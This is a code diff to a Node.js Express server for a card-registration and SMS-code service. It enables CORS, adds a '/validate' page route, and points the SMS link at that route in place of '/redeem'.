@@ -1,6 +1,9 @@
 const express = require('express');
 const bodyParser = require('body-parser');
+const cors = require('cors');
 const app = express();
+
+app.use(cors());
 
 const { Vonage } = require('@vonage/server-sdk')
 
@@ -32,11 +35,15 @@ app.get('/register', (req, res) => {
     res.sendFile(__dirname + '/views/register.html');
 });
 
-// Serve the redemption page
-app.get('/redeem', (req, res) => {
-    res.sendFile(__dirname + '/views/redemption.html');
+// Serve the validate page
+app.get('/validate', (req, res) => {
+    res.sendFile(__dirname + '/views/validate.html');
 });
 
+// Serve the redemption page
+app.get('/redeem', (req, res) => {
+    res.sendFile(__dirname + '/views/redeem.html');
+});
 // Register API - stores card number and phone number
 app.post('/api/register', (req, res) => {
     const { cardNumber, phoneNumber } = req.body;
@@ -121,7 +128,7 @@ function waitForValidation(cardNumber) {
 async function sendSMS(phoneNumber, code) {
     const from = "16162829547"
     const to = `1${phoneNumber}`
-    const text = `${scheme}://${SERVER}/redeem?code=${code}&j=`
+    const text = `${scheme}://${SERVER}/validate?code=${code}&j=`
 
     console.log(text);
 
